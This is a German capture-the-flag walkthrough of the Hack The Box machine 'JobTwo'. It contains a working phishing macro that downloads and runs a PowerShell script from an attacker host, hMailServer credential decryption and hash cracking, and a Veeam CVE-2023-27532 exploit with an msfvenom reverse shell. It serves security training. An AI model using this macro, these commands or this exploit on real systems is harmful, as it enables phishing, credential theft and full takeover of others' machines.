# Hack The Box - JobTwo (Deutsches Walkthrough)

## Synopsis

JobTwo ist eine Windows-Maschine mit hohem Schwierigkeitsgrad, bei der der initiale Zugriff über einen Macro-Phishing-Angriff erfolgt. Auf dem Ziel läuft hMailServer, dessen Konfigurationsdatei verschlüsselte Zugangsdaten für die Datenbank enthält. Nach dem Extrahieren der Passwortdatenbank wird die SQL Server Compact Datenbankdatei (`.sdf`) entschlüsselt, wodurch Anmeldedaten gewonnen werden, mit denen ein kompromittierter Benutzer per WinRM auf das System zugreifen kann.

Für Privilege Escalation besitzt das System eine verwundbare Version von Veeam Backup & Replication. Darüber lässt sich ein bösartiges Executable über `sqlserver.exe`, das als SYSTEM läuft, ausführen, was vollständigen Zugriff ermöglicht.

**Benötigte Kenntnisse:**
- Grundlegende Phishing-Angriffe
- Grundverständnis von hMailServer und Veeam

**Gelernt in dieser Box:**
- Erstellen bösartiger Office-Makros
- Auslesen verschlüsselter hMailServer-Datenbanken
- Ausnutzung von Veeam Backup & Replication

## Enumeration

### Nmap

```text
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.129.238.35 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -Pn -p$ports -sC -sV 10.129.238.35
```

**Der Scan zeigt mehrere interessante Dienste:**
- SMTP über hMailServer auf Port 25
- HTTP/HTTPS auf 80 und 443
- WinRM auf 5985
- RDP auf 3389
- mehrere Veeam-bezogene Dienste

**Besonders interessant ist das SSL-Zertifikat:**
- DNS: `job2.vl`
- DNS: `www.job2.vl`

Beim Aufruf von `www.job2.vl` erscheint eine Landing Page, auf der ein Captain gesucht wird und Bewerbungen in Form eines Microsoft-Word-Dokuments an `hr@job2.vl` gesendet werden sollen. Da SMTP offen ist, können E-Mails direkt zugestellt werden.

**Mail-Service:**
- hMailServer

## Initial Access / Foothold

Wir erstellen ein makrofähiges Word-Dokument (`.docm`) und senden dieses an HR.

**Makro:**
```vb
Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
  ByVal lpCmdLine As String, _
  ByVal uCmdShow As Long) As Long

Sub AutoOpen()
  WinExec "powershell.exe iex(iwr -uri http://10.10.15.254/shell.ps1 -UseBasicParsing)", SHOW_HIDE
End Sub
```

**Dokument per SMTP versenden:**
```text
sendemail -s 10.129.238.35 -f "0xEr3bus <0xEr3bus@htb.vl>" -t hr@job2.vl -o tls=no -m "hey" -a cv.docm
```

**HTTP-Server starten:**
```text
python3 -m http.server 80
```

**Listener:**
```text
nc -lnvp 1337
```

Nach ungefähr zwei Minuten greift das Ziel das Payload ab und wir erhalten eine Reverse Shell als:
- `job2\julian`

## hMailServer Enumeration

**Im Verzeichnis:**
```text
C:\Program Files (x86)\hMailServer\Bin
```

**lesen wir:**
```text
cat hMailServer.INI
```

**Interessante Funde:**
```text
AdministratorPassword=8a53bc...
Type=MSSQLCE
Password=4e9989caf04eaa5ef87fd1f853f08b62
PasswordEncryption=1
```

Das MSSQLCE-Passwort ist verschlüsselt und muss entschlüsselt werden.

## Lateral Movement

### `hm_decrypt` bauen

```text
git clone https://github.com/mvdnes/hm_decrypt
cd hm_decrypt
dotnet build
```

**Wegen .NET-Framework-Fehlern:**
```text
sudo apt install mono-devel
export FrameworkPathOverride=/usr/lib/mono/4.5
dotnet build
```

**Passwort entschlüsseln:**
```text
wine bin/Debug/hmailserver_password.exe dec 4e9989caf04eaa5ef87fd1f853f08b62
```

**Ergebnis:**
- `95C02068FD5D`

### `hMailServer.sdf` dumpen

Datei lokal kopieren:

```text
C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf
```

Unter einer Windows-VM mit SQL Server Compact ein kleines .NET-Projekt erstellen, das Inhalte ausliest.

**Nach Build:**
```text
MSBuild.exe .\ReadDB.csproj
.\bin\Debug\ReadDB.exe
```

**Dump:**
- `Julian@job2.vl - <hash>`
- `Ferdinand@job2.vl - 04063d4de2e5...`
- `hr@job2.vl - <hash>`

**Hash cracken:**
```text
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Treffer:**
- `Franzi123!`

### WinRM Zugriff

```text
evil-winrm -i 10.129.238.35 -u Ferdinand -p 'Franzi123!'
```

**User:**
- `job2\ferdinand`

**User Flag:**
```text
C:\Users\Ferdinand\Desktop\user.txt
```

## Privilege Escalation

**Prozesse prüfen:**
- `Veeam.Backup.Service`
- `Veeam.Backup.Manager`
- `Veeam.Backup.BrokerService`

**Version prüfen:**
```powershell
[System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\veeam.backup.service.exe").FileVersion
```

**Ergebnis:**
- `10.0.1.4854`

**Verwundbar gegenüber:**
- `CVE-2023-27532`

### DLLs holen

Die folgenden DLLs lokal ziehen und im PoC-Projekt referenzieren:

```text
C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Interaction.MountService.dll
C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Model.dll
C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll
```

Im Projekt den Else-Block (Zeilen 94-146) entfernen, da keine Credential-Extraktion nötig ist.

### Payload erzeugen

```text
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1338 -f exe > shell.exe
```

**Exploit und Payload hochladen:**
```text
upload VeeamHax.exe
upload shell.exe
```

**Listener:**
```text
nc -lnvp 1338
```

**Exploit starten:**
```text
.\VeeamHax.exe --cmd C:\Users\Ferdinand\Documents\shell.exe
```

Der Trigger erfolgt über den Veeam-Service. Danach läuft die Payload als SYSTEM.

## Angriffskette Kurzüberblick

- Macro-Phishing
- Reverse Shell als `julian`
- hMailServer Credential Recovery
- Dump der `.sdf`-Datenbank
- Passwort-Crack für `Ferdinand`
- WinRM Zugriff
- Veeam RCE / SYSTEM Execution
- Root
